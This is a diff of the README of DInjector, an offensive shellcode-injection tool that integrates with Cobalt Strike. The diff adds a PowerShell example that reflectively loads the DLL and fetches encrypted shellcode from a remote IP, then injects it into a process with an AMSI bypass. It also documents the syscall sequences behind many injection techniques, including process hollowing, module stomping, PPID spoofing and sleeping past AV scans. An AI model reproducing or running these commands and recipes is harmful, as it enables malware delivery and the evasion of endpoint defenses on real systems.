@@ -72,6 +72,14 @@ Global arguments:
 | `/am51`     | ❌        | `True`, `False`          | Applies AMSI bypass                                                |
 | `/unhook`   | ❌        | `True`, `False`          | Unhooks ntdll.dll                                                  |
 
+Test it locally:
+
+```powershell
+PS > $bytes = [System.IO.File]::ReadAllBytes("C:\DInjector.dll")
+PS > $assem = [System.Reflection.Assembly]::Load($bytes)
+PS > [DInjector.Detonator]::Boom("remothread /sc:http://10.10.13.37/enc /password:Passw0rd! /pid:1337 /am51:True".split(" "))
+```
+
 ## Cobalt Strike Integration
 
 In order to use DInjector from Cobalt Strike compile the project as a console application and put the assembly next to the Aggressor script.
@@ -89,8 +97,8 @@ module_name: 'functionpointer'
 arguments:
 description: |
   Allocates a RW memory region, copies the shellcode into it and executes it like a function.
-calls:
-  - ntdll.dll:
+api_calls:
+  - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
 opsec_safe: false
@@ -113,8 +121,8 @@ module_name: 'functionpointerv2'
 arguments:
 description: |
   Sets RX on a byte array and executes it like a function.
-calls:
-  - ntdll.dll:
+api_calls:
+  - syscalls:
     1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
 opsec_safe: false
 references:
@@ -130,12 +138,12 @@ module_name: 'clipboardpointer'
 arguments:
 description: |
   Copies shellcode bytes into the clipboard, sets RX on it and executes it like a function.
-calls:
-  - user32.dll:
+api_calls:
+  - dynamic_invocation:
     1: 'OpenClipboard'
     2: 'SetClipboardData'
     3: 'CloseClipboard'
-  - ntdll.dll:
+  - syscalls:
     1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
 opsec_safe: true
 references:
@@ -150,8 +158,10 @@ arguments:
 description: |
   Injects shellcode into current process.
   Thread execution via NtCreateThreadEx.
-calls:
-  - ntdll.dll:
+api_calls:
+  - dynamic:
+    1: 'CloseHandle'
+  - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     3: 'NtCreateThreadEx'
@@ -169,12 +179,11 @@ arguments:
 description: |
   Injects shellcode into current process.
   Thread execution via EnumSystemLocalesA.
-calls:
-  - kernel32.dll:
+api_calls:
+  - dynamic_invocation:
     1: 'HeapCreate'
-    2: 'EnumSystemLocalesA'
-  - rpcrt4.dll:
-    1: 'UuidFromStringA'
+    2: 'UuidFromStringA'
+    3: 'EnumSystemLocalesA'
 opsec_safe: false
 references:
   - 'https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/'
@@ -190,8 +199,10 @@ arguments: |
 description: |
   Injects shellcode into an existing remote process.
   Thread execution via NtCreateThreadEx.
-calls:
-  - ntdll.dll:
+api_calls:
+  - dynamic:
+    1: 'CloseHandle (x2)'
+  - syscalls:
     1: 'NtOpenProcess'
     2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     3: 'NtWriteVirtualMemory (shellcode)'
@@ -212,8 +223,10 @@ arguments: |
 description: |
   Injects shellcode into an existing remote process overwriting one of its loaded modules' .text section.
   Thread execution via NtCreateThreadEx.
-calls:
-  - ntdll.dll:
+api_calls:
+  - dynamic:
+    1: 'CloseHandle (x2)'
+  - syscalls:
     1: 'NtOpenProcess'
     2: 'NtWriteVirtualMemory (shellcode)'
     3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
@@ -232,14 +245,16 @@ arguments: |
 description: |
   Injects shellcode into an existing remote process.
   Thread execution via RtlCreateUserThread.
-calls:
-  - ntdll.dll:
+api_calls:
+  - dynamic_invocation:
+    1: 'RtlCreateUserThread'
+    2: 'CloseHandle (x2)'
+  - syscalls:
     1: 'NtOpenProcess'
     2: 'NtCreateSection (PAGE_EXECUTE_READWRITE)'
     3: 'NtMapViewOfSection (PAGE_READWRITE)'
     4: 'NtMapViewOfSection (PAGE_EXECUTE_READ)'
-    5: 'RtlCreateUserThread'
-    6: 'NtUnmapViewOfSection'
+    5: 'NtUnmapViewOfSection'
 opsec_safe: false
 references:
   - 'https://github.com/chvancooten/OSEP-Code-Snippets/blob/main/Sections%20Shellcode%20Process%20Injector/Program.cs'
@@ -255,8 +270,10 @@ description: |
   Injects shellcode into an existing remote process and flips memory protection to PAGE_NOACCESS.
   After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
   Thread execution via NtCreateThreadEx.
-calls:
-  - ntdll.dll:
+api_calls:
+  - dynamic:
+    1: 'CloseHandle (x2)'
+  - syscalls:
     1: 'NtOpenProcess'
     2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     3: 'NtWriteVirtualMemory (shellcode)'
@@ -279,11 +296,12 @@ arguments: |
 description: |
   Injects shellcode into an existing remote GUI process by spoofing the fnCOPYDATA value in KernelCallbackTable.
   Thread execution via SendMessageA.
-calls:
-  - user32.dll:
+api_calls:
+  - dynamic_invocation:
      1: 'FindWindowExA'
      2: 'SendMessageA'
-  - ntdll.dll:
+     3: 'CloseHandle (x2)'
+  - syscalls:
      1: 'NtOpenProcess'
      2: 'NtQueryInformationProcess'
      3: 'NtReadVirtualMemory (kernelCallbackAddress)'
@@ -313,13 +331,14 @@ arguments: |
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via NtQueueApcThread.
-calls:
-  - kernel32.dll:
+api_calls:
+  - dynamic_invocation:
     1: 'InitializeProcThreadAttributeList'
     2: 'UpdateProcThreadAttribute (blockDLLs)'
     3: 'UpdateProcThreadAttribute (PPID)'
     4: 'CreateProcessA'
-  - ntdll.dll:
+    5: 'CloseHandle (x2)'
+  - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtWriteVirtualMemory (shellcode)'
     3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
@@ -343,13 +362,14 @@ arguments: |
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via SetThreadContext.
-calls:
-  - kernel32.dll:
+api_calls:
+  - dynamic_invocation:
     1: 'InitializeProcThreadAttributeList'
     2: 'UpdateProcThreadAttribute (blockDLLs)'
     3: 'UpdateProcThreadAttribute (PPID)'
     4: 'CreateProcessA'
-  - ntdll.dll:
+    5: 'CloseHandle (x2)'
+  - syscalls:
     1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtWriteVirtualMemory (shellcode)'
     3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
@@ -374,13 +394,14 @@ arguments: |
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via NtResumeThread (hollowing with shellcode).
-calls:
-  - kernel32.dll:
+api_calls:
+  - dynamic_invocation:
     1: 'InitializeProcThreadAttributeList'
     2: 'UpdateProcThreadAttribute (blockDLLs)'
     3: 'UpdateProcThreadAttribute (PPID)'
     4: 'CreateProcessA'
-  - ntdll.dll:
+    5: 'CloseHandle (x2)'
+  - syscalls:
     1: 'NtQueryInformationProcess'
     2: 'NtReadVirtualMemory (ptrImageBaseAddress)'
     3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)'
@@ -405,13 +426,14 @@ arguments: |
 description: |
   Loads a trusted module from disk and overwrites one of its exported functions.
   Thread execution via NtCreateThreadEx.
-calls:
-  - kernel32.dll:
+api_calls:
+  - dynamic_invocation:
      1: 'InitializeProcThreadAttributeList'
      2: 'UpdateProcThreadAttribute (blockDLLs)'
      3: 'UpdateProcThreadAttribute (PPID)'
      4: 'CreateProcessA'
-  - ntdll.dll:
+     5: 'CloseHandle (x3)'
+  - syscalls:
      1: 'NtAllocateVirtualMemory (bModuleName, PAGE_READWRITE)'
      2: 'NtAllocateVirtualMemory (shim, PAGE_READWRITE)'
      3: 'NtWriteVirtualMemory (bModuleName)'
